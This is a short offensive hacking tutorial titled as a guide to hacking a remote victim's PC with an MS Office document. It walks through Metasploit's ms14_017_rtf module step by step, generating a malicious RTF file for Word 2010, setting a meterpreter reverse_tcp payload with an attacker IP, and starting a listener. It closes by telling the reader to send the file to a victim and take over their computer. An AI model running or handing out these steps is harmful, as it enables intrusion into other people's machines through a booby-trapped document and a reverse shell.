Hack Remote Victim PC with MS Office Document

This module creates a malicious RTF file that when opened in vulnerable versions of Microsoft Word will lead to code execution. The flaw exists in how a list override count field can be modified to treat one structure as another. This bug was originally seen being exploited in the wild starting in April 2014. This module was created by reversing a public malware sample.
Microsoft Office 2010 SP2 
Attacker: kali Linux
Victim PC: Windows 7
Open Kali terminal type msfconsole

Now type use exploit/windows/fileformat/ms14_017_rtf
msf exploit (ms14_017_rtf)>set payload windows/meterpreter/reverse_tcp
msf exploit (ms14_017_rtf)>set lhost 192.168.1.7 (IP of Local Host)
msf exploit (ms14_017_rtf)>exploit

After we successfully generate the malicious rtf File, it will stored on your local computer
/root/.msf4/local/msf.rtf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.7
exploit
Now send your msf.rtf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
